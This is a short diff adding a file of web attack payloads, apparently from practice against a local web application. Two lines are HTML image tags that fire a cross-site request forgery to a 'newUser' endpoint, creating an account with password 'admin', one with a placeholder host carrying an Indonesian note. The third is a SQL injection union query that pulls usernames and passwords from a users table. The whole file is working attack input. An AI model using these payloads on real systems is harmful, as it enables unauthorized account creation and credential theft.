@@ -1,0 +1,3 @@
+<img src="http://KALO LINK GA WORK CCD DAN HARUS DI BODY/newUser?username=test1&password=admin&password2=admin" onerror="console.log('success')">
+<img src="http://localhost/newUser?username=test1&password=admin&password2=admin" onerror="console.log('success')">
+0 union select username, password, 3 from users
